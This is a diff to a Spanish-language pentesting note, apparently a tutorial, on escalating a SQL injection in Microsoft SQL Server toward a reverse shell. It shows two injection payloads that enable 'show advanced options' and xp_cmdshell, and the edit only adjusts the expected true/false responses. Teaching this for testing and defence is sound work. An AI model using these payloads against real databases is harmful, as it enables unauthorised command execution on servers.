@@ -5,11 +5,11 @@ En primera instancia deberemos cerciorarnos de que nuestro user es SA(sysadmin).
 
 Si la respuesta nos da true, podemos intentar conseguir una shell reversa abusando de xp_cmdshell.
 
-1. Primero habilitamos las advanced options, esta respuesta deberia darnos false.
+1. Primero habilitamos las advanced options, esta respuesta deberia darnos false sin el dato, true con el dato.
 
         ';exec sp_configure 'show advanced options','1';reconfigure;--
 
-2. Habilitamos el xp_cmdshell, debería darnos false:
+2. Habilitamos el xp_cmdshell, debería darnos false sin el dato, true con el dato:
 
         ';exec sp_configure 'xp_cmdshell','1';reconfigure;--
 
